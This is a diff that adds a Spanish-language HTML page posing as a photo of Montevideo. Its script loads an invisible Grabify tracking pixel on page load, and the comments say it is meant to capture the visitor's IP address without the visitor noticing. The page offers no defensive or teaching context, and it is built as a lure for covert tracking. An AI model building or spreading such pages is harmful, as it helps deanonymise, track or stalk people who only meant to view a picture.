@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vista de Montevideo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <script>
+        // ¡REEMPLAZAR AQUÍ con el enlace de PIXEL INVISIBLE DIRECTO que generó en Grabify!
+        const PIXEL_TRACKER_URL = 'https://grabify.link/pixel/NUEVOPIXEL'; 
+        
+        const pixel = new Image();
+        pixel.src = PIXEL_TRACKER_URL + '?' + Date.now();
+        pixel.onload = () => console.log("Rastreador de IP ejecutado de forma invisible.");
+    </script>
+    
+    <style>
+        body { margin: 0; background-color: #000; }
+        .container { text-align: center; padding-top: 5vh; }
+        img { max-width: 90%; height: auto; display: inline-block; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/AlwlHpE.jpeg" alt="Imagen de Montevideo">
+    </div>
+</body>
+</html>
